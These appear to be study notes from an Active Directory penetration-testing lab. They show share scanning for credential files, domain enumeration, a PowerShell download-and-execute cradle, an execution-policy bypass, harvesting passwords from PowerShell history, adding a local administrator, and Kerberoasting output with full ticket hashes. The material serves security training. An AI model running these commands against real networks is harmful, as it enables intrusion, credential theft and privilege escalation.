2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM&gt;(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>group membership</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  Get-DomainGroupMember -Identity &#34;Domain Admins&#34; -Recurse</code></pre></div><p><a href=#R-image-aa53204122f05779112919195c90860c class=lightbox-link><img alt=c3650e0f26e19e18b933cfed6bddc4d2.png class="lazy lightbox figure-image" loading=lazy src=../../resources/c3650e0f26e19e18b933cfed6bddc4d2.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-aa53204122f05779112919195c90860c><img alt=c3650e0f26e19e18b933cfed6bddc4d2.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/c3650e0f26e19e18b933cfed6bddc4d2.png></a></p><p>Â </p><h4 id=trust-enumeration>Trust Enumeration</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM</code></pre></div><p>Â </p><p>Test admin access</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True</code></pre></div><p>Â </p><p>Â </p><h4 id=finding-users-with-spn-set>Finding Users With SPN Set</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2</code></pre></div><p>Â </p><h1 id=living-off-the-land>Living Off the Land</h1><p>Â </p><h4 id=basic-enumeration-commands>Basic Enumeration Commands</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td><code>hostname</code></td><td>Prints the PC&rsquo;s Name</td></tr><tr><td><code>[System.Environment]::OSVersion.Version</code></td><td>Prints out the OS version and revision level</td></tr><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Prints the patches and hotfixes applied to the host</td></tr><tr><td><code>ipconfig /all</code></td><td>Prints out network adapter state and configurations</td></tr><tr><td><code>set</code></td><td>Displays a list of environment variables for the current session (ran from CMD-prompt)</td></tr><tr><td><code>echo %USERDOMAIN%</code></td><td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td></tr><tr><td><code>echo %logonserver%</code></td><td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td></tr></tbody></table><h4 id=basic-enumeration>Basic Enumeration</h4><p>Â </p><p><a href=#R-image-963161ae3e27d2768bc1ca16e8acfef7 class=lightbox-link><img alt=fdb64a7a7ea227c721e1bf3b3b3d8d0f.png class="lazy lightbox figure-image" loading=lazy src=../../resources/fdb64a7a7ea227c721e1bf3b3b3d8d0f.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-963161ae3e27d2768bc1ca16e8acfef7><img alt=fdb64a7a7ea227c721e1bf3b3b3d8d0f.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/fdb64a7a7ea227c721e1bf3b3b3d8d0f.png></a></p><p>Â </p><p>Â </p><p>Â </p><h2 id=harnessing-powershell>Harnessing PowerShell</h2><p>Â </p><table><thead><tr><th><strong>Cmd-Let</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>Lists available modules loaded for use.</td></tr><tr><td><code>Get-ExecutionPolicy -List</code></td><td>Will print the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2" rel=external>execution policy</a> settings for each scope on a host.</td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>This will change the policy for our current process using the <code>-Scope</code> parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won&rsquo;t be making a permanent change to the victim host.</td></tr><tr><td><code>Get-ChildItem Env: | ft Key,Value</code></td><td>Return environment values such as key paths, users, computer information, etc.</td></tr><tr><td><code>Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td><td>With this string, we can get the specified user&rsquo;s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td></tr><tr><td><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands>"</code></td><td></td></tr></tbody></table><p>Â </p><p>powershell.exe -version 2</p><p>Â </p><p>Â Furewall</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable</code></pre></div><p>Â </p><p>Â </p><h3 id=checking-defenses>Checking Defenses</h3><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:</code></pre></div><p>Â </p><p>Â </p><p>windefend antivirus</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0</code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpda</code></pre></div><p>Â </p><h2 id=am-i-alone>Am I Alone?</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
&gt;console           forend                    1  Active
 rdp-tcp                                 65536  Listen</code></pre></div><p>Â </p><h2 id=network-information>Network Information</h2><p>Â </p><table><thead><tr><th><strong>Networking Commands</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>arp -a</code></td><td>Lists all known hosts stored in the arp table.</td></tr><tr><td><code>ipconfig /all</code></td><td>Prints out adapter settings for the host. We can figure out the network segment from here.</td></tr><tr><td><code>route print</code></td><td>Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.</td></tr><tr><td><code>netsh advfirewall show allprofiles</code></td><td></td></tr></tbody></table><p>Â </p><p>Â </p><h4 id=using-arp--a>Using arp -a</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; arp -a

Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h2 id=windows-management-instrumentation-wmi>Windows Management Instrumentation (WMI)</h2><p>Â </p><p><a href=#R-image-17b22d28bd0d31cba8908d4360b481de class=lightbox-link><img alt=cdb1cec62e7341870e12f7f0c9a648c2.png class="lazy lightbox figure-image" loading=lazy src=../../resources/cdb1cec62e7341870e12f7f0c9a648c2.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-17b22d28bd0d31cba8908d4360b481de><img alt=cdb1cec62e7341870e12f7f0c9a648c2.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cdb1cec62e7341870e12f7f0c9a648c2.png></a></p><p>Â </p><p>Â </p><h4 id=quick-wmi-checks>Quick WMI checks</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Prints the patch level and description of the Hotfixes applied</td></tr><tr><td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td><td>Displays basic host information to include any attributes within the list</td></tr><tr><td><code>wmic process list /format:list</code></td><td>A listing of all processes on host</td></tr><tr><td><code>wmic ntdomain list /format:list</code></td><td>Displays information about the Domain and Domain Controllers</td></tr><tr><td><code>wmic useraccount list /format:list</code></td><td>Displays information about all local accounts and any domain accounts that have logged into the device</td></tr><tr><td><code>wmic group list /format:list</code></td><td>Information about all local groups</td></tr><tr><td><code>wmic sysaccount list /format:list</code></td><td>Dumps information about any system accounts that are being used as service accounts.</td></tr></tbody></table><p>Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This <a href=https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4 rel=external>cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p><h2 id=net-commands>Net Commands</h2><p>Â </p><h4 id=table-of-useful-net-commands>Table of Useful Net Commands</h4><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>net accounts</code></td><td>Information about password requirements</td></tr><tr><td><code>net accounts /domain</code></td><td>Password and lockout policy</td></tr><tr><td><code>net group /domain</code></td><td>Information about domain groups</td></tr><tr><td><code>net group "Domain Admins" /domain</code></td><td>List users with domain admin privileges</td></tr><tr><td><code>net group "domain computers" /domain</code></td><td>List of PCs connected to the domain</td></tr><tr><td><code>net group "Domain Controllers" /domain</code></td><td>List PC accounts of domains controllers</td></tr><tr><td><code>net group &lt;domain_group_name> /domain</code></td><td>User that belongs to the group</td></tr><tr><td><code>net groups /domain</code></td><td>List of domain groups</td></tr><tr><td><code>net localgroup</code></td><td>All available groups</td></tr><tr><td><code>net localgroup administrators /domain</code></td><td>List users that belong to the administrators group inside the domain (the group <code>Domain Admins</code> is included here by default)</td></tr><tr><td><code>net localgroup Administrators</code></td><td>Information about a group (admins)</td></tr><tr><td><code>net localgroup administrators [username] /add</code></td><td>Add user to administrators</td></tr><tr><td><code>net share</code></td><td>Check current shares</td></tr><tr><td><code>net user &lt;ACCOUNT_NAME> /domain</code></td><td>Get information about a user within the domain</td></tr><tr><td><code>net user /domain</code></td><td>List all users of the domain</td></tr><tr><td><code>net user %username%</code></td><td>Information about the current user</td></tr><tr><td><code>net use x: \computer\share</code></td><td>Mount the share locally</td></tr><tr><td><code>net view</code></td><td>Get a list of computers</td></tr><tr><td><code>net view /all /domain[:domainname]</code></td><td>Shares on the domains</td></tr><tr><td><code>net view \computer /ALL</code></td><td>List shares of a computer</td></tr><tr><td><code>net view /domain</code></td><td>List of PCs of the domain</td></tr></tbody></table><p>Â </p><p>DSQUERY</p><p><a href=#R-image-250889d115bbed66ddae74709372c10a class=lightbox-link><img alt=fc59e14f497d0236abb2be740bde2c55.png class="lazy lightbox figure-image" loading=lazy src=../../resources/fc59e14f497d0236abb2be740bde2c55.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-250889d115bbed66ddae74709372c10a><img alt=fc59e14f497d0236abb2be740bde2c55.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/fc59e14f497d0236abb2be740bde2c55.png></a></p><p>Â </p><p>Â </p><h4 id=users-with-specific-attributes-set-passwd_notreqd>Users With Specific Attributes Set (PASSWD_NOTREQD)</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; dsquery * -filter &#34;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&#34; -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</code></pre></div><p>Â </p><p>Â </p><h1 id=kerberoasting---from-linux>Kerberoasting - from Linux</h1><p>Â </p><h2 id=kerberoasting---performing-the-attack>Kerberoasting - Performing the Attack</h2><p>Depending on your position in a network, this attack can be performed in multiple ways:</p><ul><li>From a non-domain joined Linux host using valid domain user credentials.</li><li>From a domain-joined Linux host as root after retrieving the keytab file.</li><li>From a domain-joined Windows host authenticated as a domain user.</li><li>From a domain-joined Windows host with a shell in the context of a domain account.</li><li>As SYSTEM on a domain-joined Windows host.</li><li>From a non-domain joined Windows host using <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525%28v=ws.11%29" rel=external>runas</a> /netonly.</li></ul><p>Several tools can be utilized to perform the a</p><p>Â </p><h4 id=requesting-all-tgs-tickets>Requesting all TGS Tickets</h4><p>Kerberoasting - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
</span></span><span style=display:flex><span>---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
</span></span><span style=display:flex><span>backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               
</span></span><span style=display:flex><span>sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               
</span></span><span style=display:flex><span>MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               
</span></span><span style=display:flex><span>MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               
</span></span><span style=display:flex><span>MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               
</span></span><span style=display:flex><span>adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt;               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d
</span></span><span style=display:flex><span>$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6